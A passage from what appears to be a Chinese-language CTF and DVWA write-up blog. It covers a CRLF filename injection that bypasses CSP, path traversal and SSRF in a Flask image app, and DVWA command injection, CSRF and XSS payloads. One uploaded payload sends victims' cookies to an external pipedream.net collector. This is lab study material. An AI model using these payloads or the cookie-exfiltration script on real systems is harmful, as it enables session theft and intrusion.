<span class="hljs-string">&#x27;and&#x27;</span>))  &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not found&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-variable">$address</span> = <span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-string">&quot;bot&quot;</span>);<br>            <span class="hljs-variable">$port</span> = <span class="hljs-number">5000</span>;<br>            <span class="hljs-variable">$socket</span> = <span class="hljs-title function_ invoke__">socket_create</span>(AF_INET, SOCK_STREAM, SOL_TCP);<br>    <br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$socket</span> === <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error! plz contact admin&quot;</span>);<br>            &#125;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">socket_connect</span>(<span class="hljs-variable">$socket</span>, <span class="hljs-variable">$address</span>, <span class="hljs-variable">$port</span>);<br>    <br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> === <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error! plz contact admin&quot;</span>);<br>            &#125;<br>            <span class="hljs-variable">$report_url</span> = <span class="hljs-string">&quot;http://webserver/&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>].<span class="hljs-string">&quot;?p=read&amp;idx=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;idx&#x27;</span>];<br>            <span class="hljs-title function_ invoke__">socket_write</span>(<span class="hljs-variable">$socket</span>, <span class="hljs-variable">$report_url</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$report_url</span>));<br>            <span class="hljs-title function_ invoke__">socket_close</span>(<span class="hljs-variable">$socket</span>);<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;report&quot;</span>] = <span class="hljs-title function_ invoke__">time</span>();<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;done&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Invalid parameter&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nop&quot;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先要注意的是，我们有一个IDOR（不安全的直接对象引用），让我们通过ID访问任何文件来下载，并且某种CRLF（回车符）能让我们覆盖<code>content-disposition</code>，使响应为文件内容下载的内联页面而不是下载文件，并且没有在页面上显示内容使得 XSS 成为可能</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">header(<span class="hljs-string">&quot;content-disposition: attachment; filename=\&quot;</span>$original\<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>可以通过回车重写请求头，像这样：<code>asdf\rjunk.html</code><br>在<code>board.php</code>可以将文件以附件形式上传，代码如下：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">$insert[<span class="hljs-string">&#x27;file_name&#x27;</span>] = $<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br></code></pre></td></tr></table></figure><p>存在回车绕过可能<br>存在CSP：</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">&#x27;self&#x27;</span>; <span class="hljs-keyword">style-src</span> <span class="hljs-string">&#x27;self&#x27;</span><br></code></pre></td></tr></table></figure><p>这个CSP允许我们包含来自同一个域的脚本，一个简单的绕过就是先上传一个包含javascript代码的文件来执行，然后再上传另一个文件来包含download.php页面上的js代码<br>第一个请求如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/board.php?p=write</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>58.225.56.195<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>681<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://58.225.56.195<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarydFZmSiashN04RJ1C<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://58.225.56.195/board.php?p=write<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=23c454a3f075dc9dc737e6fe71a98644<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;title&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">testy</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;content&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">asdf</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;level&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">1</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;myFile.html&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/html</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">document.<span class="hljs-keyword">location</span>=&quot;https://enwau6gu4zv3.x.pipedream.net/?x=&quot;.concat(encodeURIComponent(document.cookie));</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;password&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">benjeddou</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C--</span></span><br></code></pre></td></tr></table></figure><p>获得上传的文件：<a href="http://58.225.56.195/download.php?idx=">http://58.225.56.195/download.php?idx=</a>…<br>上传第二个文件，其名称中包含回车符，以便将第一个文件作为脚本加载。<code>\r</code>在下面请求中被替换为回车，因为执行url编码不能正确工作，所以需要在burpsuite改变十六进制请求来注入回车。<br>第二个请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/board.php?p=write</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>58.225.56.195<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>681<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://58.225.56.195<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarydFZmSiashN04RJ1C<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://58.225.56.195/board.php?p=write<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=23c454a3f075dc9dc737e6fe71a98644<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;title&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">testy</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;content&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">asdf</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;level&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">1</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;AA\r.html&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/html</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script src=&quot;/download.php?idx=975&quot;&gt;&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;password&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">benjeddou</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C--</span></span><br></code></pre></td></tr></table></figure><p>以上可以通过<a href="http://58.225.56.195/download.php?idx=">http://58.225.56.195/download.php?idx=</a>… 访问，通过bot使用<a href="http://58.225.56.195/report.php?path=download.php&amp;idx=">http://58.225.56.195/report.php?path=download.php&amp;idx=</a>… 获得flag</p><h2 id="mosaic"><a href="#mosaic" class="headerlink" title="mosaic"></a>mosaic</h2><p>文件上传+文件包含+SSRF</p><p>查看原代码，该网页允许上传文件</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sas">@app.route(<span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def upload():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;logged_in&#x27;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">redirect</span>(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No file part&#x27;</span><br>        <span class="hljs-keyword">file</span> = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">file</span>.<span class="hljs-keyword">filename</span> == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No selected file&#x27;</span><br>        <span class="hljs-keyword">filename</span> = os.path.basename(<span class="hljs-keyword">file</span>.<span class="hljs-keyword">filename</span>)<br>        guesstype = mimetypes.guess_type(<span class="hljs-keyword">filename</span>)[0]<br>        image_path = os.path.joi<span class="hljs-meta">n</span>(f<span class="hljs-string">&#x27;&#123;UPLOAD_FOLDER&#125;/&#123;session[&quot;username&quot;]&#125;&#x27;</span>, <span class="hljs-keyword">filename</span>)<br>        <span class="hljs-keyword">if</span> type_check(guesstype):<br>            <span class="hljs-keyword">file</span>.save(image_path)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;upload.html&quot;</span>, image_path = image_path)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Allowed file types are png, jpeg, jpg, zip, tiff..&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;upload.html&quot;</span>)<br></code></pre></td></tr></table></figure><p>可以通过<code>/mosaic</code>访问上传图像的马赛克版本：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/mosaic&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-built_in">mosaic</span>():<br>    if <span class="hljs-keyword">not</span> session.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;logged_in&#x27;</span>):<br>        return <span class="hljs-built_in">redirect</span>(<span class="hljs-built_in">url_for</span>(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    if request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        image_url = request.form.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;image_url&#x27;</span>)<br>        if image_url <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;../&quot;</span> <span class="hljs-keyword">not</span> in image_url <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> image_url.<span class="hljs-built_in">startswith</span>(<span class="hljs-string">&quot;/&quot;</span>):<br>            guesstype = mimetypes.<span class="hljs-built_in">guess_type</span>(image_url)[<span class="hljs-number">0</span>]<br>            ext = guesstype.<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">1</span>]<br>            mosaic_path = os.path.<span class="hljs-built_in">join</span>(f<span class="hljs-string">&#x27;&#123;MOSAIC_FOLDER&#125;/&#123;session[&quot;username&quot;]&#125;&#x27;</span>, f<span class="hljs-string">&#x27;&#123;os.urandom(8).hex()&#125;.&#123;ext&#125;&#x27;</span>)<br>            filename = os.path.<span class="hljs-built_in">join</span>(f<span class="hljs-string">&#x27;&#123;UPLOAD_FOLDER&#125;/&#123;session[&quot;username&quot;]&#125;&#x27;</span>, image_url)<br>            if os.path.<span class="hljs-built_in">isfile</span>(filename):<br>                image = imageio.<span class="hljs-built_in">imread</span>(filename)<br>            elif image_url.<span class="hljs-built_in">startswith</span>(<span class="hljs-string">&quot;http://&quot;</span>) or image_url.<span class="hljs-built_in">startswith</span>(<span class="hljs-string">&quot;https://&quot;</span>):<br>                return <span class="hljs-string">&quot;Not yet..! sry..&quot;</span><br>            <span class="hljs-attribute">else</span>:<br>                if <span class="hljs-built_in">type_check</span>(guesstype):<br>                    image_data = requests.<span class="hljs-built_in">get</span>(image_url, headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:request.headers.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;Cookie&quot;</span>)&#125;).content<br>                    image = imageio.<span class="hljs-built_in">imread</span>(image_data)<br>            <br>            <span class="hljs-built_in">apply_mosaic</span>(image, mosaic_path)<br>            return <span class="hljs-built_in">render_template</span>(<span class="hljs-string">&quot;mosaic.html&quot;</span>, mosaic_path = mosaic_path)<br>        <span class="hljs-attribute">else</span>:<br>            return <span class="hljs-string">&quot;Plz input image_url or Invalid image_url..&quot;</span><br>    return <span class="hljs-built_in">render_template</span>(<span class="hljs-string">&quot;mosaic.html&quot;</span>)<br></code></pre></td></tr></table></figure><p>可以发现flag文件如下：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">if</span> <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.exists(<span class="hljs-string">&quot;/flag.png&quot;</span>):<br>    FLAG = <span class="hljs-string">&quot;/flag.png&quot;</span><br><span class="hljs-keyword">else</span>:<br>    FLAG = <span class="hljs-string">&quot;/test-flag.png&quot;</span><br></code></pre></td></tr></table></figure><p>在路径<code>/flag.png</code><br>由此，可以尝试上传文件<code>./file.zip/flag.png</code>或<code>./file.zip#flag.png</code><br>存在目录遍历：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/check_upload/@&lt;username&gt;/&lt;file&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_upload</span>(<span class="hljs-params">username, file</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;logged_in&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">and</span> session[<span class="hljs-string">&quot;username&quot;</span>] != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Access Denied..&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;UPLOAD_FOLDER&#125;</span>/<span class="hljs-subst">&#123;username&#125;</span>&#x27;</span>, file)<br></code></pre></td></tr></table></figure><p>可以使用用户名<code>../</code>绕过获得管理员密码文件<code>password.txt</code>，以此登录管理员账号<br>由以上代码，需从localhost访问，在<code>/mosaic</code>存在ssrf</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> os<span class="hljs-selector-class">.path</span><span class="hljs-selector-class">.isfile</span>(filename):<br>               image = imageio<span class="hljs-selector-class">.imread</span>(filename)<br>           elif image_url<span class="hljs-selector-class">.startswith</span>(<span class="hljs-string">&quot;http://&quot;</span>) or image_url<span class="hljs-selector-class">.startswith</span>(<span class="hljs-string">&quot;https://&quot;</span>):<br>               return <span class="hljs-string">&quot;Not yet..! sry..&quot;</span><br>           <span class="hljs-keyword">else</span>:<br>               <span class="hljs-keyword">if</span> <span class="hljs-built_in">type_check</span>(guesstype):<br>                   image_data = requests<span class="hljs-selector-class">.get</span>(image_url, headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:request<span class="hljs-selector-class">.headers</span><span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;Cookie&quot;</span>)&#125;)<span class="hljs-selector-class">.content</span><br>                   image = imageio<span class="hljs-selector-class">.imread</span>(image_data)<br></code></pre></td></tr></table></figure><p>对于<code>http://</code>可以使用<code>Http://</code>代替，可以使用<code>Http://localhost:9999/#test.png </code>绕过，访问<code>http://58.229.185.52:9999/check_upload/@admin/flag.png</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/09/06:DVWA记录</title>
    <link href="/2023/09/06/DVWA/"/>
    <url>/2023/09/06/DVWA/</url>
    
    <content type="html"><![CDATA[<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>这里要求爆破</p><h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><p>直接爆破，猜到弱密码admin/password也可通关，没啥防护</p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h3><p>无防护的命令注入，使用<code>|</code>连接想要的命令即可</p><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="LOW-2"><a href="#LOW-2" class="headerlink" title="LOW"></a>LOW</h3><p>查看源码，直接GET传参即可，如<code>http://127.0.0.1/1.php</code><br>这里<code>allow_url_include</code>被禁用，需手动开启</p><h2 id="Cross-Site-Request-Forgery-CSRF"><a href="#Cross-Site-Request-Forgery-CSRF" class="headerlink" title="Cross Site Request Forgery (CSRF)"></a>Cross Site Request Forgery (CSRF)</h2><h3 id="LOW-3"><a href="#LOW-3" class="headerlink" title="LOW"></a>LOW</h3><p>这里仅检测新密码在验证时是否相同，保证二者相同即可修改密码<br>诱导点击连接<code>http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change#</code>，需使用短链接伪装</p><h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><h3 id="LOW-4"><a href="#LOW-4" class="headerlink" title="LOW"></a>LOW</h3><p>无任何过滤，直接上传即可</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="LOW-5"><a href="#LOW-5" class="headerlink" title="LOW"></a>LOW</h3><p>测试可得单引号闭合，无过滤</p><h2 id="Weak-Session-IDs"><a href="#Weak-Session-IDs" class="headerlink" title="Weak Session IDs"></a>Weak Session IDs</h2><h3 id="LOW-6"><a href="#LOW-6" class="headerlink" title="LOW"></a>LOW</h3><p>burp抓取请求包，将其黏贴到重新打开的DVWA界面，可实现登录</p><h2 id="Reflected-Cross-Site-Scripting-XSS"><a href="#Reflected-Cross-Site-Scripting-XSS" class="headerlink" title="Reflected Cross Site Scripting (XSS)"></a>Reflected Cross Site Scripting (XSS)</h2><h3 id="LOW-7"><a href="#LOW-7" class="headerlink" title="LOW"></a>LOW</h3><p>无过滤，直接字符拼接<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h2 id="DOM-Based-Cross-Site-Scripting-XSS"><a href="#DOM-Based-Cross-Site-Scripting-XSS" class="headerlink" title="DOM Based Cross Site Scripting (XSS)"></a>DOM Based Cross Site Scripting (XSS)</h2><h3 id="LOW-8"><a href="#LOW-8" class="headerlink" title="LOW"></a>LOW</h3><p>观察url，存在GET传参，修改default参数为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h2 id="Stored-Cross-Site-Scripting-XSS"><a href="#Stored-Cross-Site-Scripting-XSS" class="headerlink" title="Stored Cross Site Scripting (XSS)"></a>Stored Cross Site Scripting (XSS)</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="Open-HTTP-Redirect"><a href="#Open-HTTP-Redirect" class="headerlink" title="Open HTTP Redirect"></a>Open HTTP Redirect</h2><p>开放重定向攻击</p><h3 id="LOW-9"><a href="#LOW-9" class="headerlink" title="LOW"></a>LOW</h3><p>输入<code> /vulnerabilities/open_redirect/source/low.php?redirect=https://digi.ninja</code>实现重定向</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/08/11：LITCTF2023</title>
    <link href="/2023/08/11/LITCTF/"/>
    <url>/2023/08/11/LITCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="写出来的"><a href="#写出来的" class="headerlink" title="写出来的"></a>写出来的</h2><h3 id="My-boss-left"><a href="#My-boss-left" class="headerlink" title="My boss left"></a>My boss left</h3><p>下载原代码查看<br>关键语句：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$valid</span>_password = <span class="hljs-string">&#x27;dGhpcyBpcyBzb21lIGdpYmJlcmlzaCB0ZXh0IHBhc3N3b3Jk&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-symbol">$logi</span>n_data[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-symbol">$valid</span>_password)<br></code></pre></td></tr></table></figure><p>只要密码正确即可获得flag<br>抓包修改即可</p><h3 id="unsecure"><a href="#unsecure" class="headerlink" title="unsecure"></a>unsecure</h3><p>由简介可知，登录账号密码分别为admin和password123，进入题目要求我们到<code>/welcome</code>页面<br>进入后输入账号密码登录，发现页面无法加载内容一直在发包<br>观察url，存在提示flag的位置在url栏，为某个get的值<br>使用burp拦截，一个个检查即可发现</p><h3 id="PingPong"><a href="#PingPong" class="headerlink" title="PingPong"></a>PingPong</h3><p>查看原代码</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-built_in">index</span>():<br>    output = None<br>    if request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        hostname = request.form[<span class="hljs-string">&#x27;hostname&#x27;</span>]<br>        cmd = <span class="hljs-string">&quot;ping -c 3 &quot;</span> + hostname<br>        output = os.<span class="hljs-built_in">popen</span>(cmd).<span 